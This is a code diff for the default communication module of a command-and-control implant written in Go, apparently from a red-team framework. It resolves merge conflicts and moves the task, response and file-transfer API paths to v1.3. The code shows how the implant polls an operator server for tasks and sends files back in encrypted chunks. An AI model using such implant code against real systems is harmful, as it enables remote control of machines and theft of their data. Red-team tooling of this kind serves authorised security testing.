@@ -182,11 +182,7 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 //GetTasking - retrieve new tasks
 func (c *C2Default) GetTasking() interface{} {
 	//log.Printf("Current C2Default config: %+v\n", c)
-<<<<<<< HEAD
-	url := fmt.Sprintf("%sapi/v1.2/tasks/callback/%s/nextTask", c.BaseURL, c.ApfellID)
-=======
 	url := fmt.Sprintf("%sapi/v1.3/tasks/callback/%s/nextTask", c.BaseURL, c.ApfellID)
->>>>>>> master
 	rawTask := c.htmlGetData(url)
 	//log.Println("Raw HTMLGetData response: ", string(rawTask))
 	task := structs.Task{}
@@ -201,11 +197,7 @@ func (c *C2Default) GetTasking() interface{} {
 
 //PostResponse - Post task responses
 func (c *C2Default) PostResponse(task structs.Task, output string) []byte {
-<<<<<<< HEAD
-	urlEnding := fmt.Sprintf("api/v1.2/responses/%s", task.ID)
-=======
 	urlEnding := fmt.Sprintf("api/v1.3/responses/%s", task.ID)
->>>>>>> master
 	return c.postRESTResponse(urlEnding, []byte(output))
 }
 
@@ -367,8 +359,8 @@ func (c *C2Default) NegotiateKey() string {
 	return sessionID
 }
 
-//Download - download a file
-func (c *C2Default) Download(task structs.Task, params string) {
+//SendFile - download a file
+func (c *C2Default) SendFile(task structs.Task, params string) {
 	//response := TaskResponse{}
 	fileReq := structs.FileRegisterRequest{}
 	fileReq.Task = task.ID
@@ -399,7 +391,7 @@ func (c *C2Default) Download(task structs.Task, params string) {
 // Get a file
 
 func (c *C2Default) GetFile(fileid string) []byte {
-	url := fmt.Sprintf("api/v1.2/files/%s/callbacks/%s", fileid, c.ApfellID)
+	url := fmt.Sprintf("api/v1.3/files/%s/callbacks/%s", fileid, c.ApfellID)
 	encfileData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url))
 
 	//decFileData := c.decryptMessage(encfileData)
@@ -414,11 +406,7 @@ func (c *C2Default) GetFile(fileid string) []byte {
 //Upload the data
 func (c *C2Default) Upload(task structs.Task, fileid string) []byte {
 
-<<<<<<< HEAD
-	url := fmt.Sprintf("api/v1.2/files/%s/callbacks/%s", fileid, c.ApfellID)
-=======
-	url := fmt.Sprintf("api/v1.3/files/%s/callbacks/%d", fileid, c.ApfellID)
->>>>>>> master
+	url := fmt.Sprintf("api/v1.3/files/%s/callbacks/%s", fileid, c.ApfellID)
 	encfileData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url))
 
 	//decFileData := c.decryptMessage(encfileData)
@@ -475,11 +463,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 		tResp.Response = base64.StdEncoding.EncodeToString(encmsg)
 		dataToSend, _ := json.Marshal(tResp)
 
-<<<<<<< HEAD
-		endpoint := fmt.Sprintf("api/v1.2/responses/%s", task.ID)
-=======
-		endpoint := fmt.Sprintf("api/v1.3/responses/%d", task.ID)
->>>>>>> master
+		endpoint := fmt.Sprintf("api/v1.3/responses/%s", task.ID)
 		resp := c.htmlPostData(endpoint, dataToSend)
 		postResp := structs.FileChunkResponse{}
 		_ = json.Unmarshal(resp, &postResp)
